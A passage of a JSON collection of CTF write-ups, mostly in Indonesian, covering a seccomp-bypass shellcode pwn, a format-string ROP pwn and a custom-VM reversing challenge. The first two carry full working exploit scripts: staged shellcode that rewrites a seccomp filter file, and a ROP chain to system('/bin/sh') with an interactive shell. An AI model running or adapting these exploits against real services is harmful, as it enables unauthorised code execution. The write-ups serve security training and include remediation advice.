        "content": "Karena stack executable, saya tidak perlu gadget libc atau ret2libc panjang. Cukup:\n\n- taruh shellcode di buffer\n- overwrite RIP dengan alamat buffer hasil leak\n\nPayload umum:\n\n\n\nSetelah `ret`, eksekusi langsung lompat ke shellcode di stack.",
        "code": "payload = shellcode.ljust(72, b\"\\x90\") + p64(buf_addr)"
      },
      {
        "title": "Step 7 — Patch `filter.txt` to Allow `read`",
        "content": "Masalah utama exploit adalah seccomp. Syscall `read` diblok, jadi shellcode ORW biasa tidak akan bisa membaca file flag.\n\nSolusinya adalah memanfaatkan fakta bahwa:\n\n- `open` diizinkan\n- `write` diizinkan\n- target membaca filter dari file lokal `./filter.txt` tiap proses baru\n\nMaka shellcode tahap pertama hanya melakukan:\n\n1. `open(\"./filter.txt\", O_WRONLY | O_TRUNC, 0)`\n2. `write(fd, \"0\\n1\\n2\\n60\\n231\\n262\\n\", 17)`\n3. `exit(0)`\n\nIsi baru `filter.txt` menambahkan syscall `0`, yaitu `read`.\n\nSetelah koneksi berikutnya dibuat, proses baru memuat filter yang sudah dipatch. Mulai saat itu exploit bisa melakukan ORW normal."
      },
      {
        "title": "Step 8 — Verify the Patch Remotely",
        "content": "Sesudah patch, saya uji baca `./filter.txt` di remote. Output-nya berubah jadi:\n\n\n\nArtinya patch berhasil dan persisten antar-koneksi.",
        "code": "0\n1\n2\n60\n231\n262"
      },
      {
        "title": "Step 10 — Bypass the 72-byte Path Limit",
        "content": "Ada masalah baru: string path flag terlalu panjang untuk dimasukkan langsung ke shellcode 72 byte bersama logic ORW.\n\nSolusinya adalah split jadi dua tahap:\n\n#### Stage 0\n\nShellcode mini di stack:\n\n1. `read(0, stage2_addr, 0x400)`\n2. `jmp stage2_addr`\n\nKarena `read` sekarang sudah allowed, stage kecil ini cukup pendek untuk muat dalam 72 byte.\n\n#### Stage 1\n\nSetelah stage 0 berjalan, saya kirim shellcode kedua yang lebih panjang berisi:\n\n1. `open(\"/flagm5eJllzNN3E3DIBAmwuiWWDyWcqnsOpGz3pannFU.txt\", O_RDONLY)`\n2. `read(fd, outbuf, 0x200)`\n3. `write(1, outbuf, nbytes)`\n4. `exit(0)`\n\nHasilnya flag tercetak ke socket.\n\n---"
      },
      {
        "title": "Remediation",
        "content": "1. **Jangan pernah pakai `printf(user_input)`** — selalu gunakan format string tetap seperti `printf(\"%s\", buf)`\n2. **Batasi panjang input sesuai ukuran buffer** — gunakan `read(fd, buf, sizeof(buf)-1)` atau wrapper yang aman\n3. **Nonaktifkan executable stack** — aktifkan NX dengan benar dan hilangkan segment RWX\n4. **Jangan simpan policy seccomp di file yang bisa diubah proses target** — whitelist harus hardcoded atau dimuat dari lokasi read-only\n5. **Tambahkan stack canary dan full RELRO** — ini tidak menyelesaikan semua bug, tapi menaikkan biaya exploit secara signifikan\n\n---"
      },
      {
        "title": "Attack Flow",
        "content": "",
        "code": "Start binary\n      │\n      ▼\nFind format string + overflow in vuln()\n      │\n      ▼\nLeak stack address with %1$p\nLeak return into main with %15$p\n      │\n      ▼\nOne-byte RIP overwrite -> re-enter vuln()\n      │\n      ▼\nJump to shellcode on executable stack\n      │\n      ▼\nStage 1: overwrite ./filter.txt so syscall read(0) is allowed\n      │\n      ▼\nReconnect to service\n      │\n      ▼\nPatch again to allow getdents64\n      │\n      ▼\nList \"/\" and discover randomized flag filename\n      │\n      ▼\nUse tiny loader shellcode: read bigger stage from socket\n      │\n      ▼\nStage 2: open/read/write randomized flag file\n      │\n      ▼\nPrint flag -> RMCTF{AI-imitation}"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport argparse\r\nimport os\r\nimport re\r\nimport time\r\n\r\nfrom pwn import asm, context, p64, process, remote\r\n\r\ncontext.arch = \"amd64\"\r\ncontext.os = \"linux\"\r\n\r\nPROMPT = b\"Give us your move: \"\r\nORIGINAL_FILTER = b\"1\\n2\\n60\\n231\\n262\\n\"\r\nPATCHED_FILTER = b\"0\\n1\\n2\\n60\\n231\\n262\\n\"\r\nOFF_VULN_CALL = 0x13A7\r\n\r\n\r\ndef log(msg):\r\n    print(msg, flush=True)\r\n\r\n\r\ndef reset_local_filter(path):\r\n    with open(path, \"wb\") as fp:\r\n        fp.write(ORIGINAL_FILTER)\r\n\r\n\r\ndef open_tube(args):\r\n    if args.host:\r\n        return remote(args.host, args.port)\r\n    return process([args.binary], cwd=args.cwd)\r\n\r\n\r\ndef leak_and_reenter(io):\r\n    io.recvuntil(PROMPT)\r\n    payload = (b\"%1$p.%15$p\\n\\x00\").ljust(72, b\"A\") + b\"\\xa7\"\r\n    io.send(payload)\r\n    out = io.recvuntil(PROMPT)\r\n    vals = [int(x, 16) for x in re.findall(rb\"0x[0-9a-fA-F]+\", out)]\r\n    if len(vals) < 2:\r\n        raise RuntimeError(f\"failed to parse leaks: {out!r}\")\r\n    buf = vals[0]\r\n    pie = vals[1] - OFF_VULN_CALL\r\n    return buf, pie, out\r\n\r\n\r\ndef build_patch_shellcode(filter_path):\r\n    patch = PATCHED_FILTER.decode(\"latin1\").replace(\"\\n\", \"\\\\n\")\r\n    sc = asm(\r\n        f\"\"\"\r\n        lea rdi, [rip+path]\r\n        push 0x201\r\n        pop rsi\r\n        push 2\r\n        pop rax\r\n        cdq\r\n        syscall\r\n        xchg eax, edi\r\n        lea rsi, [rip+data]\r\n        push {len(PATCHED_FILTER)}\r\n        pop rdx\r\n        push 1\r\n        pop rax\r\n        syscall\r\n        xor edi, edi\r\n        push 60\r\n        pop rax\r\n        syscall\r\n    path:\r\n        .asciz \"{filter_path}\"\r\n    data:\r\n        .ascii \"{patch}\"\r\n    \"\"\"\r\n    )\r\n    if len(sc) > 72:\r\n        raise RuntimeError(f\"patch shellcode too long: {len(sc)}\")\r\n    return sc\r\n\r\n\r\ndef build_read_shellcode(target_path, out_addr, read_size):\r\n    sc = asm(\r\n        f\"\"\"\r\n        lea rdi, [rip+path]\r\n        xor esi, esi\r\n        push 2\r\n        pop rax\r\n        cdq\r\n        syscall\r\n        xchg eax, edi\r\n        mov rsi, {out_addr}\r\n        mov dx, {read_size}\r\n        xor eax, eax\r\n        syscall\r\n        mov edx, eax\r\n        push 1\r\n        pop rdi\r\n        push 1\r\n        pop rax\r\n        syscall\r\n        xor edi, edi\r\n        push 60\r\n        pop rax\r\n        syscall\r\n    path:\r\n        .asciz \"{target_path}\"\r\n    \"\"\"\r\n    )\r\n    if len(sc) > 72:\r\n        raise RuntimeError(f\"read shellcode too long: {len(sc)}\")\r\n    return sc\r\n\r\n\r\ndef run_stage(args, shellcode):\r\n    io = open_tube(args)\r\n    try:\r\n        buf, pie, leaks = leak_and_reenter(io)\r\n        payload = shellcode.ljust(72, b\"\\x90\") + p64(buf)\r\n        io.send(payload)\r\n        data = io.recvall(timeout=args.timeout)\r\n        return buf, pie, leaks + data\r\n    finally:\r\n        io.close()\r\n\r\n\r\ndef run_read_stage(args):\r\n    io = open_tube(args)\r\n    try:\r\n        buf, pie, leaks = leak_and_reenter(io)\r\n        shellcode = build_read_shellcode(args.flag_path, buf + 0x200, args.read_size)\r\n        payload = shellcode.ljust(72, b\"\\x90\") + p64(buf)\r\n        io.send(payload)\r\n        data = io.recvall(timeout=args.timeout)\r\n        return buf, pie, leaks + data\r\n    finally:\r\n        io.close()\r\n\r\n\r\ndef extract_flag(blob):\r\n    patterns = [\r\n        rb\"(RAM\\{[^}\\r\\n\\x00]{1,200}\\})\",\r\n        rb\"(flag\\{[^}\\r\\n\\x00]{1,200}\\})\",\r\n        rb\"([A-Za-z0-9_\\-]+\\{[^}\\r\\n\\x00]{1,200}\\})\",\r\n    ]\r\n    for pat in patterns:\r\n        match = re.search(pat, blob, re.IGNORECASE)\r\n        if match:\r\n            return match.group(1).decode(\"utf-8\", \"replace\")\r\n    return None\r\n\r\n\r\ndef resolve_defaults(args):\r\n    if not args.host:\r\n        args.binary = os.path.abspath(args.binary)\r\n        args.cwd = os.path.abspath(args.cwd or os.path.dirname(args.binary))\r\n    if args.flag_path is None:\r\n        args.flag_path = \"/flag.txt\" if args.host else \"./flag.txt\"\r\n\r\n\r\ndef main():\r\n    parser = argparse.ArgumentParser()\r\n    parser.add_argument(\"host\", nargs=\"?\")\r\n    parser.add_argument(\"port\", nargs=\"?\", type=int)\r\n    parser.add_argument(\"--binary\", default=\"./challenge\")\r\n    parser.add_argument(\"--cwd\")\r\n    parser.add_argument(\"--filter-path\", default=\"./filter.txt\")\r\n    parser.add_argument(\"--flag-path\")\r\n    parser.add_argument(\"--timeout\", type=float, default=1.0)\r\n    parser.add_argument(\"--read-size\", type=int, default=0x100)\r\n    parser.add_argument(\"--skip-patch\", action=\"store_true\")\r\n    parser.add_argument(\"--only-patch\", action=\"store_true\")\r\n    parser.add_argument(\"--no-reset\", action=\"store_true\")\r\n    args = parser.parse_args()\r\n\r\n    if bool(args.host) ^ bool(args.port):\r\n        parser.error(\"pass both HOST and PORT, or neither\")\r\n\r\n    resolve_defaults(args)\r\n\r\n    if not args.host and not args.no_reset:\r\n        reset_local_filter(os.path.join(args.cwd, args.filter_path))\r\n\r\n    if not args.skip_patch:\r\n        log(\"[*] Stage 1: patch filter.txt\")\r\n        shellcode = build_patch_shellcode(args.filter_path)\r\n        _, _, out = run_stage(args, shellcode)\r\n        if args.only_patch:\r\n            print(out.decode(\"latin1\", \"replace\"))\r\n            return 0\r\n        time.sleep(0.2)\r\n\r\n    log(\"[*] Stage 2: read target file\")\r\n    _, _, out = run_read_stage(args)\r\n    flag = extract_flag(out)\r\n    if flag:\r\n        print(f\"<FLAG>{flag}</FLAG>\")\r\n        return 0\r\n    print(out.decode(\"latin1\", \"replace\"))\r\n    return 1\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "RMCTF{AI-imitation}",
    "lessonsLearned": ""
  },
  {
    "id": "ram-pwn-llmshutdown",
    "title": "LLM Showdown PWN",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "RAM",
    "tags": [],
    "description": "Writeup for challenge LLM Showdown PWN",
    "problemDescription": "Binary ini kecil banget dan bug utamanya ada di fungsi `echo()`. Program membaca input ke buffer stack ukuran 0x20, tapi setelah itu buffer dipakai langsung sebagai format string:\n\n```c\nread(0, buf, 0x1f);\nprintf(buf);\n```\n\nJadi ini bukan overflow klasik. `read()` hanya 31 byte, sedangkan buffer 32 byte, jadi RIP tidak ketimpa langsung. Jalan masuknya adalah format string vulnerability.\n\nProteksi yang kelihatan dari `readelf`/analisis lokal:\n\n- ELF 64-bit PIE\n- NX aktif (`GNU_STACK` tidak executable)\n- Tidak ada stack canary (`__stack_chk_fail` tidak ada)\n- RELRO partial, GOT masih writable\n- Binary tidak stripped, simbol `main` dan `echo` masih ada",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Bug penting",
        "content": "Disassembly fungsi `echo()`:\n\n\n\nKarena `printf()` dipanggil tanpa format tetap, input seperti `%10$p` bisa membaca stack, dan `%n/%hn/%hhn` bisa dipakai untuk menulis ke alamat yang kita taruh sendiri di buffer.\n\nLayout argumen format string yang kepakai:\n\n- argumen ke-6 mulai dari isi buffer offset 0\n- argumen ke-9 membaca qword di buffer offset 24\n\nMakanya payload write dibuat seperti ini:\n\n\n\nByte ke-8 alamat tidak perlu dikirim karena buffer sudah di-zero-kan sebelum `read()`, dan alamat userland canonical byte tertingginya `0x00`.",
        "code": "sub    rsp,0x20\n...\nread(0, rbp-0x20, 0x1f)\nprintf(rbp-0x20)\nleave\nret"
      },
      {
        "title": "Leak",
        "content": "Payload leak:\n\n\n\nHasilnya:\n\n- `%10$p` = stack anchor / saved RBP milik `main`\n- `%11$p` = return address setelah echo pertama, yaitu `PIE + 0x121e`\n- `%13$p` = return address `main` ke libc, yaitu `libc + 0x29ca8`\n\nDari sini didapat:",
        "code": "%10$p.%11$p.%13$p"
      },
      {
        "title": "Bikin loop stabil",
        "content": "Program hanya memanggil `echo()` dua kali. Supaya bisa punya banyak kesempatan write, return address echo kedua diarahkan balik ke bagian `main` sebelum path `Name:`:\n\n\n\nReturn normal echo kedua adalah `PIE + 0x1237`. Karena masih satu page, cukup ubah low byte `0x37` menjadi `0x05` memakai `%hhn` ke slot return address echo:\n\n\n\nLoop ke `main+0x1205` ini enak karena stack anchor tetap stabil. Kalau balik ke awal `main`, stack akan turun 8 byte tiap putaran karena prologue `push rbp`, jadi ROP chain lebih gampang rusak.",
        "code": "main + 0x1205"
      },
      {
        "title": "Arbitrary write",
        "content": "Primitive write yang dipakai adalah 2-byte write:\n\n\n\nTarget address diletakkan di offset 24 buffer, sehingga bisa diakses sebagai `%9$hn`.\n\nSetiap satu putaran loop:\n\n1. Echo pertama dipakai untuk write 2 byte ke alamat target.\n2. Echo kedua dipakai untuk mengembalikan eksekusi lagi ke `main+0x1205`.",
        "code": "%1$<value>c%9$hn"
      },
      {
        "title": "ROP chain",
        "content": "ROP chain ditulis ke area saved return milik `main`, relatif dari stack anchor hasil leak:\n\n\n\nRet gadget pertama dipakai untuk alignment stack sebelum masuk `system()`. Tanpa gadget ini exploit lokal sempat crash karena alignment tidak pas.\n\nSetelah semua chain tertulis, echo terakhir dibiarkan return normal. `main` selesai, lalu saved RIP milik `main` sudah mengarah ke ROP chain dan akhirnya memanggil:",
        "code": "stack+0x08 = ret gadget          (PIE + 0x1016)\nstack+0x10 = pop rdi; ret        (libc + 0x2a145)\nstack+0x18 = pointer \"/bin/sh\"   (libc + 0x1a5ea4)\nstack+0x20 = system              (libc + 0x53110)"
      },
      {
        "title": "Cara jalanin",
        "content": "Local:\n\n\n\nRemote:\n\n\n\nDefault command di solver akan mencoba baca flag:\n\n\n\nKalau mau shell interaktif tanpa auto command:",
        "code": "python3 solve.py local"
      },
      {
        "title": "Catatan libc",
        "content": "Offset libc yang dipakai di solver berasal dari environment lokal yang dipakai waktu analisis:",
        "code": "__libc_start_main return leak : 0x29ca8\npop rdi; ret                  : 0x2a145\n/bin/sh                       : 0x1a5ea4\nsystem                        : 0x53110"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport os\r\nimport re\r\nimport sys\r\nimport time\r\nimport socket\r\nimport struct\r\nimport select\r\nimport subprocess\r\nfrom typing import Optional\r\n\r\nPROMPT = b\"Please provide your input\\n\"\r\n\r\n# Offsets dari binary yang diberikan\r\nECHO_RET_AFTER_FIRST = 0x121e\r\nLOOP_MAIN_SKIP_PROLOGUE = 0x11d3   # main+4, biar rbp/rsp tidak geser saat loop\r\nPIE_RET_GADGET = 0x1016            # ret; di _init\r\n\r\n# Offsets libc lokal challenge. Bisa dioverride kalau remote pakai libc lain:\r\n#   LIBC_RET_OFF=0x... POP_RDI=0x... SYSTEM=0x... BINSH=0x... python3 solve.py REMOTE\r\nLIBC_RET_OFF = int(os.getenv(\"LIBC_RET_OFF\", \"0x29ca8\"), 0)\r\nPOP_RDI      = int(os.getenv(\"POP_RDI\",      \"0x2a145\"), 0)\r\nSYSTEM       = int(os.getenv(\"SYSTEM\",       \"0x53110\"), 0)\r\nBINSH        = int(os.getenv(\"BINSH\",        \"0x1a5ea4\"), 0)\r\n\r\nDEFAULT_HOST = os.getenv(\"HOST\", \"10.42.5.10\")\r\nDEFAULT_PORT = int(os.getenv(\"PORT\", \"1337\"))\r\nDEFAULT_BIN  = os.getenv(\"BIN\", \"./challenge\")\r\nDEFAULT_CMD  = os.getenv(\"CMD\", \"cat flag* /flag* /home/ctf/flag* 2>/dev/null; id\")\r\n\r\n\r\ndef p64(x: int) -> bytes:\r\n    return struct.pack(\"<Q\", x & 0xffffffffffffffff)\r\n\r\n\r\ndef halfwords(x: int):\r\n    # pointer userspace x86-64 cukup 3 halfword bawah; halfword ke-4 tetap 0x0000\r\n    return [(x >> (16 * i)) & 0xffff for i in range(3)]\r\n\r\n\r\ndef write16_payload(addr: int, val: int, idx: int = 8) -> bytes:\r\n    \"\"\"Satu payload format string: tulis 2 byte val ke addr memakai %idx$hn.\r\n    Address diletakkan di offset 16 supaya menjadi argumen format ke-8.\r\n    \"\"\"\r\n    val &= 0xffff\r\n    if val == 0:\r\n        fmt = f\"%{idx}$hn\".encode()\r\n    else:\r\n        fmt = f\"%{val}c%{idx}$hn\".encode()\r\n    if len(fmt) > 16:\r\n        raise ValueError(f\"format terlalu panjang: {fmt!r}\")\r\n    payload = fmt.ljust(16, b\"A\") + p64(addr)\r\n    if len(payload) > 31:\r\n        raise ValueError(f\"payload terlalu panjang: {len(payload)}\")\r\n    return payload\r\n\r\n\r\nclass Tube:\r\n    def __init__(self, mode: str, host: str, port: int, path: str):\r\n        self.mode = mode\r\n        self.proc: Optional[subprocess.Popen] = None\r\n        self.sock: Optional[socket.socket] = None\r\n        if mode == \"local\":\r\n            self.proc = subprocess.Popen([path], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=0)\r\n            self.rfd = self.proc.stdout.fileno()\r\n            self.wfd = self.proc.stdin.fileno()\r\n        else:\r\n            self.sock = socket.create_connection((host, port), timeout=8)\r\n            self.sock.setblocking(False)\r\n            self.rfd = self.sock.fileno()\r\n            self.wfd = self.sock.fileno()\r\n\r\n    def send(self, data: bytes):\r\n        if len(data) > 31 and data.startswith(b\"%\"):\r\n            raise ValueError(f\"payload format string >31 bytes: {len(data)}\")\r\n        if self.mode == \"local\":\r\n            os.write(self.wfd, data)\r\n        else:\r\n            assert self.sock is not None\r\n            self.sock.sendall(data)\r\n\r\n    def recv_some(self, timeout: float = 1.0) -> bytes:\r\n        end = time.time() + timeout\r\n        out = b\"\"\r\n        while True:\r\n            left = end - time.time()\r\n            if left <= 0:\r\n                break\r\n            r, _, _ = select.select([self.rfd], [], [], left)\r\n            if not r:\r\n                break\r\n            try:\r\n                if self.mode == \"local\":\r\n                    chunk = os.read(self.rfd, 4096)\r\n                else:\r\n                    assert self.sock is not None\r\n                    chunk = self.sock.recv(4096)\r\n            except BlockingIOError:\r\n                continue\r\n            if not chunk:\r\n                break\r\n            out += chunk\r\n        return out\r\n\r\n    def recvuntil(self, token: bytes, limit: int = 25_000_000) -> bytes:\r\n        data = b\"\"\r\n        while token not in data:\r\n            r, _, _ = select.select([self.rfd], [], [], 10)\r\n            if not r:\r\n                raise TimeoutError(f\"timeout menunggu {token!r}, data terakhir={data[-200:]!r}\")\r\n            if self.mode == \"local\":\r\n                chunk = os.read(self.rfd, 4096)\r\n            else:\r\n                assert self.sock is not None\r\n                chunk = self.sock.recv(4096)\r\n            if not chunk:\r\n                raise EOFError(f\"EOF, data terakhir={data[-300:]!r}\")\r\n            data += chunk\r\n            if len(data) > limit:\r\n                raise RuntimeError(\"output terlalu besar; kemungkinan offset salah\")\r\n        return data\r\n\r\n    def interactive(self):\r\n        print(\"[*] interactive mode. Ctrl-C untuk keluar.\")\r\n        try:\r\n            while True:\r\n                fds = [self.rfd, sys.stdin.fileno()]\r\n                r, _, _ = select.select(fds, [], [])\r\n                if self.rfd in r:\r\n                    if self.mode == \"local\":\r\n                        data = os.read(self.rfd, 4096)\r\n                    else:\r\n                        assert self.sock is not None\r\n                        data = self.sock.recv(4096)\r\n                    if not data:\r\n                        return\r\n                    sys.stdout.buffer.write(data)\r\n                    sys.stdout.buffer.flush()\r\n                if sys.stdin.fileno() in r:\r\n                    data = os.read(sys.stdin.fileno(), 4096)\r\n                    if not data:\r\n                        return\r\n                    self.send(data)\r\n        except KeyboardInterrupt:\r\n            print(\"\\n[*] closed\")\r\n\r\n\r\ndef exploit(io: Tube):\r\n    io.recvuntil(PROMPT)\r\n\r\n    # Leak: rbp utama, PIE return, dan return address libc dari stack.\r\n    io.send(b\"%10$p.%11$p.%13$p.\")\r\n    leak_chunk = io.recvuntil(PROMPT)\r\n    m = re.search(rb\"(0x[0-9a-fA-F]+)\\.(0x[0-9a-fA-F]+)\\.(0x[0-9a-fA-F]+)\\.\", leak_chunk)\r\n    if not m:\r\n        raise RuntimeError(f\"gagal parse leak: {leak_chunk[:300]!r}\")\r\n\r\n    rbp = int(m.group(1), 16)\r\n    pie_ret = int(m.group(2), 16)\r\n    libc_ret = int(m.group(3), 16)\r\n\r\n    pie_base = pie_ret - ECHO_RET_AFTER_FIRST\r\n    libc_base = libc_ret - LIBC_RET_OFF\r\n    ret_slot = rbp - 8\r\n\r\n    print(f\"[+] rbp       = {rbp:#x}\")\r\n    print(f\"[+] pie_base  = {pie_base:#x}\")\r\n    print(f\"[+] libc_base = {libc_base:#x}\")\r\n    print(f\"[+] ret_slot  = {ret_slot:#x}\")\r\n\r\n    loop_low = (pie_base + LOOP_MAIN_SKIP_PROLOGUE) & 0xffff\r\n    final_ret_low = (pie_base + PIE_RET_GADGET) & 0xffff\r\n\r\n    # Echo kedua dari putaran awal: lompat balik ke main+4 agar dapat loop stabil.\r\n    io.send(write16_payload(ret_slot, loop_low))\r\n    io.recvuntil(PROMPT)\r\n\r\n    # Chain final akan berada mulai dari [rbp]. Ret slot akan diarahkan ke gadget ret PIE,\r\n    # lalu gadget ret itu mengambil chain[0] dari [rbp].\r\n    chain = [libc_base + POP_RDI, libc_base + BINSH, libc_base + SYSTEM]\r\n    print(\"[+] chain:\")\r\n    print(f\"    pop rdi; ret = {chain[0]:#x}\")\r\n    print(f\"    /bin/sh      = {chain[1]:#x}\")\r\n    print(f\"    system       = {chain[2]:#x}\")\r\n\r\n    # Satu loop = echo pertama menulis 1 halfword chain, echo kedua mengembalikan flow ke main+4.\r\n    for q_index, qword in enumerate(chain):\r\n        for h_index, value in enumerate(halfwords(qword)):\r\n            where = rbp + q_index * 8 + h_index * 2\r\n            print(f\"[+] write16 {value:#06x} -> {where:#x}\")\r\n            io.send(write16_payload(where, value))\r\n            io.recvuntil(PROMPT)  # prompt Field:\r\n            io.send(write16_payload(ret_slot, loop_low))\r\n            io.recvuntil(PROMPT)  # prompt Name: pada loop berikutnya\r\n\r\n    print(f\"[+] trigger ret gadget low16 = {final_ret_low:#06x}\")\r\n    io.send(write16_payload(ret_slot, final_ret_low))\r\n\r\n    # Drain output format string dulu supaya command shell tidak ikut termakan read() terakhir.\r\n    drained = io.recv_some(0.6)\r\n    if drained:\r\n        sys.stdout.buffer.write(drained[-1200:])\r\n        sys.stdout.buffer.flush()\r\n\r\n    cmd = DEFAULT_CMD.encode() + b\"\\n\"\r\n    print(f\"\\n[+] sending command: {DEFAULT_CMD}\")\r\n    io.send(cmd)\r\n    time.sleep(0.2)\r\n    out = io.recv_some(1.2)\r\n    if out:\r\n        sys.stdout.buffer.write(out)\r\n        sys.stdout.buffer.flush()\r\n        flags = re.findall(rb\"[A-Za-z0-9_\\-]+\\{[^}\\r\\n ]+\\}\", out)\r\n        if flags:\r\n            print(f\"\\n[+] possible flag: {flags[0].decode(errors='replace')}\")\r\n\r\n    if os.getenv(\"NO_INTERACTIVE\", \"0\") != \"1\":\r\n        io.interactive()\r\n\r\n\r\ndef main():\r\n    arg = sys.argv[1].lower() if len(sys.argv) > 1 else \"remote\"\r\n    if arg in (\"local\", \"l\", \"--local\"):\r\n        mode = \"local\"\r\n    else:\r\n        mode = \"remote\"\r\n    host = sys.argv[2] if len(sys.argv) > 2 else DEFAULT_HOST\r\n    port = int(sys.argv[3]) if len(sys.argv) > 3 else DEFAULT_PORT\r\n\r\n    print(f\"[*] mode={mode}\")\r\n    if mode == \"remote\":\r\n        print(f\"[*] target={host}:{port}\")\r\n    else:\r\n        print(f\"[*] binary={DEFAULT_BIN}\")\r\n\r\n    io = Tube(mode, host, port, DEFAULT_BIN)\r\n    exploit(io)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "",
    "lessonsLearned": ""
  },
  {
    "id": "ram-rev-obfuscatednightmare",
    "title": "CTF — Obfuscated Nightmare",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "RAM",
    "tags": [],
    "description": "**Event:** Not provided  \n**Category:** Rev  \n**Difficulty:** Unknown  \n**Flag:** `RMCTF{5p34k1n6_1n_c0d3!}`",
    "problemDescription": "| # | Finding | Detail |\n|---|---|---|\n| 1 | Custom bytecode VM | The binary interprets both static and attacker-controlled 3-byte instructions |\n| 2 | Staged execution | A short built-in validator gates access to a second, more powerful execution path |\n| 3 | File I/O exposed inside VM | The VM provides enough syscalls to open, read, and print `/flag.txt` |\n| 4 | Partial key checking | The accepted AI key is constrained only in specific positions, making a printable working key possible |\n\n---",
    "tools": [
      "file",
      "gdb",
      "Ghidra",
      "Python"
    ],
    "analysis": "",
    "solution": [
      {
        "title": "Challenge Description",
        "content": "> We have found the application responsible for processing data within the Gibson itself. However, analysis conducted by our team has been inconclusive and it is not clear how this application works. Can you reverse the application and find away to see inside the Gibson's thoughts?\n\n**Target:** `10.42.5.10:1337`\n\n---"
      },
      {
        "title": "Step 1 — Triage the Binary",
        "content": "The challenge only shipped a stripped 64-bit ELF named `chall`.\n\nQuick checks showed:\n- Rust binary\n- PIE enabled\n- No symbols\n- The program prompts for input, then prints either `Wrong!` or `Welcome!`\n\nRunning it locally immediately suggested that this was not a normal password checker:\n\n\n\nThe input also behaved strangely during debugging. It was not being compared as a plain string. Instead, the binary was parsing data in fixed 3-byte chunks and feeding those chunks into an internal interpreter.",
        "code": "./chall\nAI Key:"
      },
      {
        "title": "Step 2 — Recognize the VM",
        "content": "Static analysis in Ghidra and `objdump` showed that the program builds and executes a tiny custom VM.\n\nTwo details made that clear:\n- Input is parsed in groups of 3 bytes\n- A large static blob in `.rodata` is interpreted as bytecode\n\nThat static program was responsible for printing the visible strings:\n- `AI Key:`\n- `Welcome!`\n- `Wrong!`\n\nSo the challenge was really split into two parts:\n1. Satisfy the built-in boot/validator bytecode\n2. Feed the VM a second-stage program that opens and prints `/flag.txt`\n\n---"
      },
      {
        "title": "Step 3 — Recover the AI Key",
        "content": "The first stage does not check an ordinary password. It runs a short bytecode validator over the beginning of our input and branches to either `Welcome!` or `Wrong!`.\n\nAfter tracing the branch conditions in GDB and mapping the VM instructions, the required leading bytes worked out to:\n\n\n\nThe important part is the prefix `API-`. Several later bytes are effectively filler in this path, as long as they do not break the parser.\n\nTesting that key locally:\n\n\n\nOutput:",
        "code": "b\"API-@d!!?@??AUUU\""
      },
      {
        "title": "Step 4 — Reverse the VM Instruction Set",
        "content": "The next step was understanding enough opcodes to write our own VM program.\n\nThe core instructions used in the final solve were:\n\n| Opcode form | Meaning |\n|---|---|\n| `reg, 0x21, imm` | load immediate into register |\n| `reg, 0x24, 0x00` | push register byte onto VM stack |\n| `dst, 0x26, src` | move register |\n| `sysno, 0x41, dst` | perform VM syscall, store return value in `dst` |\n| `0x00, 0x42, 0x00` | halt |\n\nThe useful syscalls were:\n\n| Syscall | Meaning |\n|---|---|\n| `1` | read from opened file into VM memory |\n| `2` | write VM memory to stdout |\n| `3` | open file path from VM memory |\n\nThat was enough. I did not need to fully recover every opcode in the VM, only the subset needed for file I/O."
      },
      {
        "title": "Step 5 — Build a Second-Stage Payload",
        "content": "The second stage pushes `/flag.txt` onto the VM stack, opens it, reads the contents into VM memory, then writes the bytes back to stdout.\n\nThe logic is:\n\n\n\nIn Python, the payload builder looked like this:\n\n\n\nThe final exploit simply sent:\n- the valid AI key\n- followed immediately by the second-stage VM program\n\nWhen run against the service, the VM opened `/flag.txt` and printed the contents directly.",
        "code": "push \"/flag.txt\"\nr0 = sp\nr1 = len(\"/flag.txt\")\nsys3 -> open(path)\n\nr0 = 0\nr1 = 0xff\nsys1 -> read(fd, mem[0], 0xff)\n\nr0 = 0\nr1 = bytes_read\nsys2 -> write(mem[0], bytes_read)\n\nhalt"
      },
      {
        "title": "Remediation",
        "content": "1. Do not expose interpreter-like functionality to untrusted input unless it is heavily sandboxed.\n2. Avoid bundling sensitive file access primitives into attacker-reachable VM/syscall handlers.\n3. If staged validation is required, do not rely on obscurity of custom bytecode as the main defense.\n4. Strip debugability where possible, but more importantly design the program so full reversal still does not expose privileged file access.\n\n---"
      },
      {
        "title": "Attack Flow",
        "content": "",
        "code": "Inspect binary\n      │\n      ▼\nNotice input is parsed as 3-byte VM instructions\n      │\n      ▼\nReverse static validator bytecode\n      │\n      ▼\nRecover valid AI key: API-...\n      │\n      ▼\nReverse enough VM opcodes/syscalls for file I/O\n      │\n      ▼\nBuild second-stage bytecode:\n  push \"/flag.txt\"\n  open\n  read\n  write\n  halt\n      │\n      ▼\nSend key + stage payload\n      │\n      ▼\nService prints: RMCTF{5p34k1n6_1n_c0d3!}"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
